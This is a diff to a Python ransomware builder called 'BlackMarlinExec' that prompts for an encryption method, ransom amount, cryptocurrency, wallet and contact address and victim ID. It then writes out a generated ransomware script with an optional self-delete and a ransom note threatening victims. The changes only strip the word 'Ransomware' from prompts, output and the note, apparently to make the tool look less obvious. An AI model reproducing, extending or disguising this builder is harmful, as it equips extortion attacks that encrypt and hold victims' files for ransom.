@@ -45,7 +45,7 @@ print("Fernet,Fernet_ReEncryption,base,Fernet_base,Fernet_ReEncryption_base,Wipe
 code_2 = input('Encryption:')
 
 print("Remove BlackMarlinExec File (RUN) Y or N?")
-code_11 = input('Files Ransomware Delete:')
+code_11 = input('Files Delete:')
 if code_11 == 'Y':
     code_11 = "os.remove(__file__)"
 else:
@@ -65,7 +65,7 @@ if code_10 == 'Y':
     Note_Text_Infection = Read_note_path
 
 if code_10 == 'N':
-    code_name_ransom = input('Ransomware Name:')
+    code_name_ransom = input('Name:')
     print("Ransom?")
     code_4 = input('Number:')
     print("Type Cryptocurrency (bitcoin or etc)")
@@ -74,7 +74,7 @@ if code_10 == 'N':
     code_6 = input('Address:')
     print("Address contact us?")
     code_7 = input('Address Contact:')
-    print("Ransomware ID Setting 1 or 2")
+    print("ID Setting 1 or 2")
     print('1 Setup you self')
     print("2 random")
     code_8 = input('Setup:')
@@ -87,8 +87,8 @@ if code_10 == 'N':
         code_8 = f'{ID_char}_{random.randint(0,99999999999)}'
     else:
         code_8 = input('ID:')
-    print("Name Who Build Ransomware Here?")
-    code_9 = input('Name:')
+    print("Name Who Build Here?")
+    code_9 = input('x-x-x-x:')
     Note_Text_Infection = f'''Attention maybe you have been infected by {code_name_ransom}!
 
 All your file have been overwrite by Encryption {code_2}
@@ -102,7 +102,7 @@ To get this software you need write on our e-mail below
 What guarantees do we give to you?
 Its just a business. We absolutely do not care about you and your deals, except getting benefits.
 
-Ransomware Make By {code_9}
+Make By {code_9}
 
 <--------- Rule
 DONT try to change files by yourself, DONT use any third party software for restoring your data.
@@ -113,8 +113,8 @@ Contact us:{code_7}
 Send ${code_4} worth of {code_5} to this Address:
 {code_6}
 
-Logs Ransomware --------------->
-Personal Ransomware ID: {code_8}
+Logs --------------->
+Personal ID: {code_8}
 Encryption Path:{code_path}
 File Extension: {code_1}
 <--------------- Logs Ransomware
@@ -254,7 +254,7 @@ Name_Files = input("BlackMarlinExec Files Name:")
 file_ransom = open(Name_Files + '.py','w')
 file_ransom.write(file_code)
 file_ransom.close()
-print(f"Setting Files . . .")
+print(f"Setting Files")
 print(f"Building . . .")
-print(f"Done Build Ransomware . . .")
-PAKTE = input("Press any key to exit . . .")
+print(f"Done Build and Exec")
+PAKTE = input("Press any key to exit ")
